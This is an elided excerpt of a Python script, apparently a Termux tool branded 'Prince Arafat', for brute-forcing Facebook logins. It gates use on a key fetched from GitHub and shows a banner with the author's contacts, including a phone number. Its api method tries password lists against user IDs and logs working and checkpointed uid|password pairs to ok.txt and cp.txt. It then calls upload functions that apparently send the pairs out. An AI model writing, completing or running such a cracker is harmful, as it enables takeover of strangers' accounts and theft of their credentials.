...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/PRINCE-ARAFAT/arafat-approval.txt/blob/main/arafat-approval.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/PrinceArafat770")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ Facebook🤲https://www.facebook.com/PrinceArafat770")
	subprocess.check_output(["am", "start", "https://www.facebook.com/PrinceArafat770"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/PRINCE-ARAFAT/arafat-approval.txt/blob/main/arafat-approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[41m\033[1;37m[Devil]   [Prince]     [Arafat]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : prince arafat \033[1;32m[arafat✌]         │
\033[1;34m│ [✓] GITHUB   :  \033[41m\033[1;37mhttp://github.com/PRINCE-ARAFAT4\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  01943520447 │
\033[1;36m│ [✓] POWER  : \x1b[1;32marafat\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
""")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [arafat-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[arafat-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [arafat-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
